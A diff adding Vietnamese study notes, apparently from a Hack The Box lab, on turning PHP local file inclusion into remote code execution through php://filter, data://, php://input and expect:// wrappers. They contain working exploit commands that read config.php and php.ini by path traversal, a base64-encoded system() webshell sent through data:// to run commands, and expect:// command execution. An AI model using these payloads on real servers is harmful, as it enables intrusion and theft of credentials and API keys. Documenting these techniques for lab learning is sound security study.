@@ -1,0 +1,128 @@
+PHP Wrappers là cơ chế của PHP cho phép truy cập các luồng (streams) khác nhau ngoài file hệ thống thông thường.
+Cú pháp:
+  scheme://target
+  (vd: php://input, php://filter/...)
+
+Các loại Wrappers phổ biến
+  File/Stream wrappers
+    file:// → truy cập file hệ thống.
+    php://input → đọc dữ liệu raw từ request body.
+    php://memory / php://temp → dùng bộ nhớ làm stream.
+  Filter wrappers
+    php://filter/read=convert.base64-encode/resource=config.php
+    → đọc file config.php ở dạng Base64 (dùng trong LFI).
+  Network wrappers
+    http://, ftp://, https:// → truy cập tài nguyên qua network.
+  Data wrapper
+    data://text/plain;base64,SGVsbG8= → nạp dữ liệu inline.
+
+
+There are four different types of filters available for use, which are String Filters, Conversion Filters, Compression Filters, and Encryption Filters. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the convert.base64-encode filter, under Conversion Filters.
+
+Fuzzing for PHP Files
+  naruto3co@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Source Code Disclosure
+
+    Nội dung này là LFI to RCE qua php:// data:// expect://
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+PHP 
+
+
+Source Code Disclosure = thay vì để PHP chạy file, ta dùng filter Base64 để xuất raw source code, rồi decode để đọc. Đây là kỹ thuật chính để đọc được mã nguồn .php qua LFI.
+
+Dùng PHP Filter wrapper để không thực thi code, mà xuất nội dung thô.
+  php://filter/read=convert.base64-encode/resource=config
+
+Khi gọi qua LFI:
+  http://<SERVER_IP>/index.php?language=php://filter/read=convert.base64-encode/resource=config
+  → Trả về nội dung config.php ở dạng Base64.
+
+Giải nén : echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
+
+
+Ý nghĩa
+  Từ file config/source code → thu được:
+  Thông tin nhạy cảm: DB credentials, API keys.
+  Đường dẫn file khác để tiếp tục khai thác.
+
+Đây là bước quan trọng để leo thang từ LFI → RCE.
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Data 
+
+Ra đời: xuất hiện từ PHP 5.2.0 (phát hành tháng 11/2006).
+Tài liệu chính thức: PHP Manual liệt kê data:// wrapper lần đầu trong changelog của PHP 5.2.0. Kể từ đó wrapper này tồn tại cho đến các phiên bản PHP hiện đại (8.x).
+Bản chất data:// dùng để dữ liệu inline (ngay trong URL) thay vì phải đọc từ file/HTTP.
+  data://<mediatype>[;base64],<data>
+Nó có thể import code trực tiếp 
+
+Điều kiện : Nếu có LFI và allow_url_include=On, attacker có thể truyền data:// chứa PHP shell → thực thi lệnh từ xa.
+
+Data Wrapper trong PHP
+  Chức năng: data:// wrapper cho phép include dữ liệu trực tiếp (inline data), kể cả PHP code.
+  Điều kiện: chỉ hoạt động nếu allow_url_include = On trong file cấu hình PHP (php.ini).
+  Bước đầu tiên: dùng LFI để đọc file config (php.ini) → kiểm tra xem allow_url_include có bật không.
+
+👉 Ý nghĩa: Nếu allow_url_include được bật, ta có thể tiêm code qua LFI bằng data:// → khả năng cao dẫn tới Remote Code Execution (RCE).
+
+  curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+
+Giải mã và kiểm tra cấu hình allow_url_include 
+  naruto3co@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+  -> kiểm tra nó có "on" k nhé 
+
+Chuẩn bị payload 
+  naruto3co@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64
+    PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+
+Tấn côngggggggggggggggggggggg
+  naruto3co@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
+    đây logic của nó sẽ như này 
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Expect
+
+Bản chất
+  expect:// là một PHP wrapper đặc biệt.
+  Chức năng: cho phép thực thi trực tiếp lệnh hệ thống thông qua URL streams.
+  Hoạt động giống như webshell, nhưng không cần upload shell vì bản chất nó đã được thiết kế để chạy command.
+
+Điều kiện sử dụng
+  Đây là external wrapper → phải được cài đặt thủ công và enable trong PHP.
+  Kiểm tra bằng cách đọc file config (php.ini) qua LFI, tìm:
+    extension=expect
+  Nếu có, thì có thể dùng để khai thác RCE.
+
+Kiểm tra : 
+  Đọc file php.ini
+    curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+  Decode 
+    naruto3co@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
+
+
+
+
+
+
+| Wrapper          | Bản chất / Chức năng                                           | Điều kiện sử dụng                                                     | Khai thác trong LFI                                                                            |
+| ---------------- | -------------------------------------------------------------- | --------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
+| **php\://input** | Cho phép đọc **raw HTTP request body**                         | `allow_url_include = On` (mặc định Off) nếu muốn include              | Gửi PHP code trong body request → include qua `php://input` → thực thi (RCE)                   |
+| **data://**      | Cho phép nhúng dữ liệu/code **inline trong URL** (text/base64) | `allow_url_include = On`                                              | Inject PHP code trực tiếp qua `data://` (vd: `data://text/plain,<?php system('id'); ?>`) → RCE |
+| **expect://**    | Wrapper để **thực thi system command** (được thiết kế sẵn)     | Cần **cài đặt & bật extension expect** trong PHP (`extension=expect`) | Truyền command trực tiếp qua URL, ví dụ `expect://id` → chạy lệnh trên server                  |
+
+🗝️ Nhận xét
+    php://input → lợi dụng body request làm code.
+    data:// → lợi dụng inline data làm code.
+    expect:// → lợi dụng wrapper để chạy command trực tiếp (không cần code PHP).
+👉 Cả 3 đều có thể biến LFI → RCE, nếu server cấu hình không an toàn.
+
+
+
